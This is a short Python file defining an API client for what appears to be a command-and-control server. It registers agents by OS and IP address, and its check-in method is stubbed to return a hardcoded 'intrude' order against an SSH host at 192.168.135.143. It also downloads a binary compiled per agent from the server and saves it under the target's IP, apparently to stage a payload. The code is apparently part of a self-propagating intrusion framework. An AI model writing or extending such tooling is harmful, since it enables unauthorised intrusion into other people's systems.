import requests
import json
import random


class ApiClient:
    def __init__(self,
                 apiUrl,
                 jwtToken):
        self._apiUrl = apiUrl
        self._jwtToken = jwtToken

    def create_agent(self,
                     os,
                     ipAddress):
        cookies = {"session": self._jwtToken}
        headers = {"Content-Type": "application/json"}
        response = requests.post(f"{self._apiUrl}/agents", json={'os': os, 'ipAddress': ipAddress}, cookies=cookies, headers=headers)
        return response.json()

    def check_in(self):
        cookies = {"session": self._jwtToken}
        headers = {"Content-Type": "application/json"}
        if True:
            return {'commands': [
                {
                    'command': 'intrude',
                    'ips': ['192.168.135.143'],
                    'port': '22',
                    'os': 'linux'
                }
                ]}

    def get_bin(self, agentId, comToken, ip):
        cookies = {"session": self._jwtToken}
        headers = {"Content-Type": "application/json"}
        response = requests.post(f"{self._apiUrl}/agents/{agentId}/compile", json={'comToken': comToken}, cookies=cookies, headers=headers)
        f = open(f"tmp/{ip}", mode='wb')
        f.write(response.content)
        f.close()
